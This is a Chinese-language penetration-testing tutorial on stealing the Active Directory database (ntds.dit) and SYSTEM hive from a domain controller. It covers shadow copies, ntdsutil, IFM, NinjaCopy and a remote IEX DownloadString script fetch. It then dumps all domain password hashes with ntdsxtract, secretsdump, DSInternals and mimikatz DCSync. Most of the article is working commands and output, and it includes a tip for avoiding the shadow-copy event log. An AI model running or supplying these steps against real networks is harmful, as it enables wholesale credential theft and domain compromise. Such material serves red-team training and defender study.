![](https://image.3001.net/images/20200929/1601339428_5f728024c623627f50e2f.jpg!small)

本文我们将演示如何获取域控制器上的Ntds.dit文件并提取其中的域账户和密码哈希。

## Ntds.dit

在域环境中，活动目录是域中提供目录服务的组件，其可以帮助用户快速准确地从目录中找到其所需要的信息。在规模较大的网络中，要把网络中的众多对象，例如计算机、用户、用户组、打印机、共享文件等分门别类、井然有序的存放在一个大仓库中，并做好信息索引，一遍查找、管理和使用这些资源对象。拥有这个层次结构的数据库就是活动目录数据库。

Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的
%SystemRoot%\ntds\ntds.dit，活动目录始终会访问这个文件，所以文件禁止被读取。Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。

而在非域环境也就是在工作组环境中，用户的密码等信息存储在SAM文件，想要破解SAM文件与Ntds.dit文件都需要拥有一个System文件。和SAM文件一样，Ntds.dit是默认被Windows系统锁定的。

## 利用VSS技术获取NTDS.dit文件

在一般情况下，Ntds.dit是默认被Windows系统锁定的，想要读取该文件就要利用卷影拷贝服务(Volume Shadow Copy
Service，VSS)，得到Ntds.dit文件的副本。卷影拷贝服务(VSS)本质上是属于快照技术的一种，主要用于备份和恢复，即使目标文件被处于锁定状态。

其获取Ntds.dit的基本步骤如下：

  1. 创建目标主机的卷影拷贝（包含Windows上的全部文件）
  2. 然后在创建的卷影拷贝中将ntds.dit复制出来
  3. 最后将当菜创建的卷影拷贝删除

### 利用vssadmin工具

vssadmin是Windows上的一个卷影拷贝服务的命令行管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息，显示已安装的所有卷影拷贝写入程序和提供程序，以及改变卷影拷贝的存储空间的大小等。

![1601343008_5f728e206ad1cfd384110.png!small](https://image.3001.net/images/20200929/1601343008_5f728e206ad1cfd384110.png!small)

其适用于： Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012
R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008

详情参考：<https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/vssadmin>

利用vssadmin命令从域控中提取ntds.dit文件的流程如下，需要域管理员权限操作：

1\. 在已经获取到权限的域控制器上执行如下命令，创建一个C盘的卷影拷贝：

    
    
    vssadmin create shadow /for=C:

![1601342571_5f728c6b3da1a07c56267.png!small](https://image.3001.net/images/20200929/1601342571_5f728c6b3da1a07c56267.png!small)

2\. 然后在创建的卷影拷贝中将ntds.dit复制到C盘中：

    
    
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit

![1601342823_5f728d67b772bbe619b13.png!small](https://image.3001.net/images/20200929/1601342823_5f728d67b772bbe619b13.png!small)

此时，便成功将Ntds.dit副本复制了出来。

3\. 最后将刚刚创建的卷影拷贝删除：

    
    
    vssadmin delete shadows /for=c: /quiet

![1601343044_5f728e441d8b50670c321.png!small](https://image.3001.net/images/20200929/1601343044_5f728e441d8b50670c321.png!small)

### 利用vssown.vbs脚本

下载地址：<https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs>

<https://github.com/borigue/ptscripts/tree/master/windows>

该脚本本质上是通过wmi对ShadowCopy进行操作，其功能与vssadmin类似，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务。

利用vssown.vbs脚本从域控中提取ntds.dit文件的流程如下，需要域管理员权限操作：

1\. 首先，在域控制器上执行如下命令启动卷影拷贝服务：

    
    
    cscript vssown.vbs /start

cscript命令专用于执行要在命令行环境中运行的脚本。

![1601343616_5f7290804a31c229aec22.png!small](https://image.3001.net/images/20200929/1601343616_5f7290804a31c229aec22.png!small)

2\. 然后执行如下命令创建一个C盘的卷影拷贝：

    
    
    cscript vssown.vbs /create c

![1601343704_5f7290d8d6eeed6509297.png!small](https://image.3001.net/images/20200929/1601343704_5f7290d8d6eeed6509297.png!small)

执行如下命令列出当前已经创建的卷影拷贝：

    
    
    cscript vssown.vbs /list

![1601343846_5f7291664610bf90a57b5.png!small](https://image.3001.net/images/20200929/1601343846_5f7291664610bf90a57b5.png!small)

如上图，我们可以看到一个ID为{D0E1B1B0-96B3-4A5E-988A-4DA2738A078D}的卷影拷贝，存储位置为\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2。

3\. 接着在创建的卷影拷贝中将ntds.dit复制到C盘中：

    
    
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit C:\ntds.dit

![1601344105_5f729269ea9bf9d1869df.png!small](https://image.3001.net/images/20200929/1601344105_5f729269ea9bf9d1869df.png!small)

4\. 得到Ntds.dit的副本之后，将刚刚创建的卷影拷贝删除就可以了：

    
    
    cscript vssown.vbs /delete <ID>  
    cscript vssown.vbs /delete {D0E1B1B0-96B3-4A5E-988A-4DA2738A078D}

![1601344264_5f729308f01cc3d4ce979.png!small](https://image.3001.net/images/20200929/1601344264_5f729308f01cc3d4ce979.png!small)

### 利用Ntdsutil.exe工具

Ntdsutil.exe 是一个为 Active Directory
提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。

您可使用 Ntdsutil.exe 执行 Active Directory 的数据库维护，管理和控制单个主机操作，创建应用程序目录分区，以及删除由未使用
Active Directory 安装向导 (DCPromo.exe) 成功降级的域控制器留下的元数据。

详情参考：<https://baike.baidu.com/item/Ntdsutil.exe/740430?fr=aladdin>

利用Ntdsutil.exe工具从域控中提取ntds.dit文件的流程如下，需要域管理员权限操作：

1\. 首先，在域控制器上执行如下命令创建一个快照：

    
    
    ntdsutil snapshot "activate instance ntds" create quit quit

该快照包含Windows中的所有文件，且在复制时不会受到Windows锁定机制的影响

![1601344993_5f7295e17bfb40d9cae45.png!small](https://image.3001.net/images/20200929/1601344993_5f7295e17bfb40d9cae45.png!small)

如上图，可以看到成功创建了一个ID为{f3ce5a64-11d7-4bcf-9858-81442e40d6cb}的快照。

然后执行如下命令，加载刚刚创建的快照：

    
    
    ntdsutil snapshot "mount <ID>" quit quit
    
    ntdsutil snapshot "mount {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" quit quit

![1601345389_5f72976d2a7e2fcfa2b27.png!small](https://image.3001.net/images/20200929/1601345389_5f72976d2a7e2fcfa2b27.png!small)

此时，便成功将刚才创建的快照加载到了系统中的C:\$SNAP_202009291002_VOLUMEC$\目录下：

![1601345625_5f7298597437b8cc4141b.png!small](https://image.3001.net/images/20200929/1601345625_5f7298597437b8cc4141b.png!small)

3\. 接着执行如下命令，将快照中的Ntds.dit文件复制到 C:\ntds.dit：

    
    
    copy C:\$SNAP_202009291002_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit
    

![1601345675_5f72988b0f48c1e30dccf.png!small](https://image.3001.net/images/20200929/1601345675_5f72988b0f48c1e30dccf.png!small)

得到ntds.dit文件的副本后，我们就可以将刚才创建并加载的快照删除了。

4\. 最后，执行如下命令将之前创建并加载的快照卸载并删除：

    
    
    ntdsutil snapshot "mount <ID>" "delete <ID>" quit quit  
      
    ntdsutil snapshot "mount {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" "delete {f3ce5a64-11d7-4bcf-9858-81442e40d6cb}" quit quit
    

![1601345820_5f72991c230c72657b93d.png!small](https://image.3001.net/images/20200929/1601345820_5f72991c230c72657b93d.png!small)

### 创建IFM提取Ntds.dit文件

除了利用上面那种操作来获取Ntds.dit外，还可以利用Ntdsutil.exe创建媒体安装集(IFM)来用于提取NTDS.dit文件。
**在使用ntdsutil创建创建媒体安装集(IFM)时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，我们可以利用该过程获取NTDS.dit文件，需要管理员权限。**

> Ntdsutil是本地处理 Active Directory
> 的命令实用程序，并为DCPromo启用IFM集创建。IFM与DCPromo一起用于“从媒体安装”，因此被升级的服务器不需要通过网络从另一个DC复制域数据。
>
>  **当创建一个IFM时，VSS快照会被自动拍摄，挂载，NTDS.DIT文件和相关数据被复制到目标文件夹中。**

在域控制器中执行如下命令即可：

    
    
    ntdsutil "ac i ntds" "ifm" "create full c:/test" q q 

![1601347449_5f729f79afafd3fa4c254.png!small](https://image.3001.net/images/20200929/1601347449_5f729f79afafd3fa4c254.png!small)

执行该命令后，会自动将ntds.dit文件复制到C:\test\Active
Directory\ntds.dit，同时会将SYSTEM和SECURITY复制到C:\test\registry目录下：

![1601347322_5f729efa14579296f1a2a.png!small](https://image.3001.net/images/20200929/1601347322_5f729efa14579296f1a2a.png!small)

![1601347338_5f729f0ac39fc1c35092b.png!small](https://image.3001.net/images/20200929/1601347338_5f729f0ac39fc1c35092b.png!small)

然后执行如下命令将ntds.dit复制到C:\ntds.dit

    
    
    copy "C:\test\Active Directory\ntds.dit" C:\ntds.dit

![1601347473_5f729f911dfa528d90321.png!small](https://image.3001.net/images/20200929/1601347473_5f729f911dfa528d90321.png!small)

最后，将我们需要的文件拖到本地后，将test文件夹删除即可。

### PowerShell下的实现

Nishang中的Copy-VSS.ps1脚本可以用于自动提取——NTDS.DIT​​，SAM和SYSTEM这些必要文件。这些文件将被解压到当前工作目录或其他任意的指定文件夹中。

下载地址：<https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1>

该脚本使用如下：

    
    
    IEX (New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/Nishang/Gather/Copy-VSS.ps1');Copy-VSS
    

![1601348351_5f72a2ff6b7fe153097a1.png!small](https://image.3001.net/images/20200929/1601348351_5f72a2ff6b7fe153097a1.png!small)

如上图，成功执行后，会将SAM、SYSTEM、Ntds.dit文件复制到与该脚本相同的目录中。

也可以将SAM、SYSTEM、Ntds.dit文件复制到指定的目录中：

    
    
    Copy-VSS -DestinationDir C:\

![1601348736_5f72a4809428a58aa3cc9.png!small](https://image.3001.net/images/20200929/1601348736_5f72a4809428a58aa3cc9.png!small)

 **除了Copy-VSS.ps1脚本，我们还可以利用PowerSploit中的Invoke-NinjaCopy脚本**

下载地址：<https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1>

该脚本用于“万能复制”，像windows主机里SAM文件、域控中的Ntds.dit，里面数据很多有价值的信息，普通的COPY命令是无法复制的，使用万能复制可以复制这类文件。该脚本使用如下：

    
    
    Invoke-NinjaCopy -Path <需要复制的文件> -LocalDestination <复制文件保存位置>

用该脚本复制Ntds.dit和SYSTEM文件：

    
    
    Import-Module .\Invoke-NinjaCopy.ps1
    Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\ntds.dit"
    Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\system.hive"
    

![1601349188_5f72a644540e81eaae977.png!small](https://image.3001.net/images/20200929/1601349188_5f72a644540e81eaae977.png!small)

如上图，复制成功。

 **这种方法没有调用Volume Shadow Copy服务，所以不会产生日志文件7036(卷影拷贝服务进入运行状态的标志)。**

##  **导出SYSTEM文件**

导出ntds.dit后，还需要导出SYSTEM，将system.hive转储，因为system.hive中存放着ntds.dit的密钥。

我们可以用上面讲的Copy-VSS.ps1等方法导出SYSTEM文件，也可以执行如下命令，将导出system

    
    
    reg save hklm\system c:\system.hive

![1601350778_5f72ac7a10252b2843d90.png!small](https://image.3001.net/images/20200929/1601350778_5f72ac7a10252b2843d90.png!small)

## 利用工具导出Ntds.dit文件中的散列值

到现在为止，我们已经学会了利用各种方法将Ntds.dit文件提取出，当我们获得了域控上的Ntds.dit文件后，接下来要做的就是想办法从Ntds.dit文件中导出其中的密码哈希散列值。

### 利用E **sedbexport和Ntdsxtract** 工具

 **（1）恢复ntds.dit并导出用户表信息**

首先我们需要从NTDS.dit文件中提取用户表格，这里我们要通过libesedb-tools中的 **esedbexport**
来帮我们完成。Libesedb是一个用于访问可扩展存储引擎（ESE）数据库文件（EDB）格式的库。当前，ESE数据库格式被应用于许多不同的应用程序上，如Windows
Search，Windows Mail，Exchange，Active Directory（NTDS.dit）等。

下载地址：<https://github.com/libyal/libesedb/releases>

首先在kali上面安装esedbexport：

    
    
    apt-get install autoconf automake autopoint libtool pkg-config     // 安装依赖
    wget https://github.com/libyal/libesedb/releases/download/20200418/libesedb-experimental-20200418.tar.gz
    cd libesedb-experimental-20191220
    ./configure
    make && make install && ldconfig

安装完成后，进入存放ntds.dit的目录，执行以下命令恢复ntds.dit并提取表信息：

    
    
    esedbexport -m tables ntds.dit        // 提取表信息

![1601356584_5f72c3280246a0fc694dd.png!small](https://image.3001.net/images/20200929/1601356584_5f72c3280246a0fc694dd.png!small)

如上图提取表成功，并且会在当前目录下生成一个“ntds.dit.export”文件夹：

![1601356796_5f72c3fc31b80cb442c07.png!small](https://image.3001.net/images/20200929/1601356796_5f72c3fc31b80cb442c07.png!small)

上图中，我们可以看到有很多表，我们在之后需要用到的表也就是 datatable.3 和 link_table.5这两个表。

 **（2）导出其中的域散列值**

ntds.dit中的表一旦被提取出来，有很多python工具可以将这些表中的信息进一步提取从而导出其中的域散列值，比如ntdsxtract就可以完美进行。该工具不仅能够提取与用户对象、组对象、计算机对象相关的信息，同时还能从NTDS.dit文件中删除对象。

安装命令：

    
    
    git clone https://github.com/csababarta/ntdsxtract.git
    cd ntdsxtract/
    python setup.py build && python setup.py install

安装完成后，我们将上一步中导出的“ntds.dit.export”文件夹中的datatable.3、link_table.5这两个表和之前获得的“SYSTEM”文件一并放入ntdsxtract的文件夹中。然后我们就可以执行如下命令，将域内的所有用户及散列值导出到result.txt文件中

    
    
    dsusers.py <datatable> <link_table> <output_dir> --syshive <systemhive> --passwordhashes <format options>      // 命令格式  
      
    python dsusers.py datatable.3 link_table.5 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt

–pwdformat选项是选择以什么格式进行提取，有john(John
format)、ocl(oclHashcat)、ophc(OphCrack)三个选项。

![1601358115_5f72c9237768d07ff79a8.png!small](https://image.3001.net/images/20200929/1601358115_5f72c9237768d07ff79a8.png!small)

![1601358181_5f72c9656492d6b7a054a.png!small](https://image.3001.net/images/20200929/1601358181_5f72c9656492d6b7a054a.png!small)

如上图所示，成功将域内的所有用户及密码哈希散列值导出来了。提取到的哈希值可以用hashcat等工具进行破解，详情请看我的另一篇文章：[《内网横向移动研究：获取域内单机密码与Hash》](../network/245697.html)

由于Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息，也就是说我们不仅可以利用Ntds.dit获得密码哈希，还可以通过分析Ntds.dit导出域内的所有计算机的其他信息，这十分有助于我们对域内信息的收集。

Ntdsxtract中还具有一个“dscomputers.py”工具可以从分离出来的表中提取域中计算机信息。这对于离线分析目标信息是非常有用的。

在使用过程中，需要对它提供datatable，输出目录以及输出文件，输出文件的格式为csv：

    
    
    python dscomputers.py datatable.3 computer_output --csvoutfile domain_computers_info.csv
    

![1601358975_5f72cc7f837b2ac4796a4.png!small](https://image.3001.net/images/20200929/1601358975_5f72cc7f837b2ac4796a4.png!small)

**注意，使用Ntdsxtract导出Ntds.dit表中的域散列值，要提供三个文件：**
**即Ntds.dit导出的ntds.dit.export文件夹中的datatable.3、link_table.5这两个表和之前获得的“SYSTEM”文件：**

![1601358016_5f72c8c07f2bcc2033a7e.png!small](https://image.3001.net/images/20200929/1601358016_5f72c8c07f2bcc2033a7e.png!small)

### 使用Impacket中的secretsdump

下载地址：<https://github.com/SecureAuthCorp/impacket>

secretsdump.py是Impacket工具包中的一个脚本，该脚本实现了多种不需要在远程主机上执行任何代理的情况下转储机密数据的技术。对于SAM和LSA
Secrets（包括缓存的凭据），我们尽可能的尝试从注册表中读取，然后将hives保存在目标系统（％SYSTEMROOT％\Temp目录）中，并从那里读取其余的数据。

secretsdump.py有一个本地选项，可以解析Ntds.dit文件并从Ntds.dit中提取哈希散列值和域信息。在此之前，我们必须获取到Ntds.dit和SYSTEM这两个文件。如果条件满足，你可以执行以下命令：

    
    
    python secretsdump.py -system /目录/system.hive -ntds /目录/ntds.dit LOCAL
    

![1601360619_5f72d2eb170cee4bf87ed.png!small](https://image.3001.net/images/20200929/1601360619_5f72d2eb170cee4bf87ed.png!small)

如上图，该脚本成功将域中所有用户的NTLM hash值呈现出来。

### PowerShell下的利用

DSInternals
PowerShell模块提供了构建在框架之上的易于使用的cmdlet。主要功能包括离线ntds.dit文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。

下载地址：<https://github.com/MichaelGrafnetter/DSInternals>

支持系统：

  * Windows Server 2012 R2
  * Windows Server 2008 R2
  * Windows 10 64-bit
  * Windows 8.1 64-bit
  * Windows 7 64-bit

安装与配置方法：

    
    
    PowerShell 5.0：  
    Install-Module DSInternals  
    或  
    Install-Module -Name DSInternals -RequiredVersion 3.2.1  
      
    PowerShell 3.0、4.0：  
    解压压缩包   
    cd C:\DSInternals  
    Import-Module .\DSInternals

详情参考：<https://www.powershellgallery.com/packages/dsinternals/3.2.1>

要使用DSInternals模块提取用户哈希值，我们需要先获取Ntds.dit、SYSTEM这两个文件。将Ntds.dit、SYSTEM这两个文件导出并拖到我们本地后，即可执行如下命令获取所有账户哈希：

    
    
    Import-Module DSInternals       // 导入DSInternals模块  
    // 获取所有账户信息：
    $key = Get-Bootkey -SystemHivePath 'C:\目录\system.hive'    
    Get-ADDBAccount -All -DBPath 'C:\目录\ntds.dit' -Bootkey $key

还可以导出支持Hashcat格式的哈希：

    
    
    $key = Get-Bootkey -SystemHivePath 'C:\目录\system.hive'  
      
    Get-ADDBAccount -All -DBPath 'C:\目录\ntds.dit' -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt

这里在我的电脑上报错了，所以就先不复现了。

以上所讲的提取哈希的方法都是离线提取，所谓离线提取一般需要两步，首先就是将远端域控的ntds.dit用卷影拷贝等技术导出并下载到本地，然后再在本地进行提取操作。下面我们来总结一下在线提取ntds.dit中的哈希的方法。

## 在线提取Ntds.dit中的哈希

### 利用dcsync获取提取Ntds.dit中的哈希

DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE
TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限。

Mimikatz下载地址：<https://github.com/gentilkiwi/mimikatz>

利用Mimikatz的dcsync功能获取提取Ntds.dit中的哈希的操作如下：

1\. 在域内任意一台主机上运行mimikatz并执行如下命令：

    
    
    lsadump::dcsync /domain:xxx.com /all /csv  
      
    lsadump::dcsync /domain:god.org /all /csv

![1601367330_5f72ed22beacaf339184b.png!small](https://image.3001.net/images/20200929/1601367330_5f72ed22beacaf339184b.png!small)

如上图，成功导出了域内所有用户的哈希散列值。

###  **PowerShell下的实现**

即Invoke-DCSync.ps1脚本。

下载地址：<https://gist.github.com/monoxgas/9d238accd969550136db>

该脚本通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能，并利用dcsync直接读取ntds.dit得到域用户密码散列值。

在域内任何一台主机上面执行如下命令：

    
    
    Import-Module .\Invoke-DCSync.ps1  
    Invoke-DCSync -DumpForest | ft -wrap -autosize    // 导出域内所有用户的hash
      
    Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize      // 导出域内administrator账户的hash

![1601368864_5f72f32012b276c01b52c.png!small](https://image.3001.net/images/20200929/1601368864_5f72f32012b276c01b52c.png!small)

如上图，成功将域内所有用户的哈希提取了出来。

## Ending......

本文我们总结了如何获取域控制器上的Ntds.dit文件并提取其中的域账户和密码哈希。获得的密码哈希可以用hashcat等工具进行破解，详情请看我的另一篇文章：[《内网横向移动研究：获取域内单机密码与Hash》](../network/245697.html)。

![](https://image.3001.net/images/20200929/1601369165_5f72f44db7d83ff2eb1f1.jpg!small)

> 参考：
>
> [https://3gstudent.github.io/3gstudent.github.io/域渗透-> 获得域控服务器的NTDS.dit文件/](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/)
>
> <https://blog.csdn.net/qq_36119192/article/details/104224851>
>
> <https://www.anquanke.com/post/id/151241>
>
>
> [https://blog.csdn.net/qq_41874930/article/details/108141331](https://blog.csdn.net/qq_41874930/article/details/108141331?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160133984419724835865284%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160133984419724835865284&biz_id=0&utm_medium=distribute.pc_search_result.none-> task-> blog-2~all~first_rank_v2~rank_v28_p-5-108141331.pc_first_rank_v2_rank_v28_p&utm_term=ntds.dit&spm=1018.2118.3001.4187)
>
> <http://www.hackdig.com/08/hack-55888.htm>
>
> [https://www.freebuf.com/sectool/176876.html](../sectool/176876.html)
>
>
> [https://www.freebuf.com/articles/system/151463.html](../articles/system/151463.html)
>
> <http://www.mottoin.com/detail/2891.html>

